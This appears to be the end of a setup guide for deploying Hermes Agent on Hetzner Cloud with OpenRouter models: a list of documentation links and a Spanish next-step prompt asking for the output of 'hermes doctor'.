- 𝗖𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝘁𝗶𝗼𝗻: https://hermes-agent.nousresearch.com/docs/user-guide/configuration/
- 𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗿𝘀 (𝗢𝗽𝗲𝗻𝗥𝗼𝘂𝘁𝗲𝗿): https://hermes-agent.nousresearch.com/docs/integrations/providers
- 𝗗𝗶𝘀𝗰𝗼𝗿𝗱: https://hermes-agent.nousresearch.com/docs/user-guide/messaging/discord
- 𝗖𝗟𝗜 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗲: https://hermes-agent.nousresearch.com/docs/reference/cli-commands
- 𝗙𝗔𝗤: https://hermes-agent.nousresearch.com/docs/reference/faq
- 𝗥𝗲𝗽𝗼 + 𝗲𝗷𝗲𝗺𝗽𝗹𝗼 𝗱𝗲 𝗰𝗼𝗻𝗳𝗶𝗴: https://github.com/NousResearch/hermes-agent
- 𝗢𝗽𝗲𝗻𝗥𝗼𝘂𝘁𝗲𝗿: https://openrouter.ai/docs
- 𝗤𝘄𝗲𝗻 𝟯.𝟲 𝗣𝗹𝘂𝘀: https://openrouter.ai/qwen/qwen3.6-plus
- 𝗠𝗶𝗻𝗶𝗠𝗮𝘅 𝗠𝟮.𝟳: https://openrouter.ai/minimax/minimax-m2.7
- 𝗛𝗲𝘁𝘇𝗻𝗲𝗿 𝗖𝗹𝗼𝘂𝗱: https://docs.hetzner.com/cloud/

---

> 𝗦𝗶𝗴𝘂𝗶𝗲𝗻𝘁𝗲 𝗽𝗮𝘀𝗼: ve a la sección 2 y elige el plan. Cuando crees el servidor, pega aquí la salida de `hermes doctor` y avanzamos con la configuración del modelo.
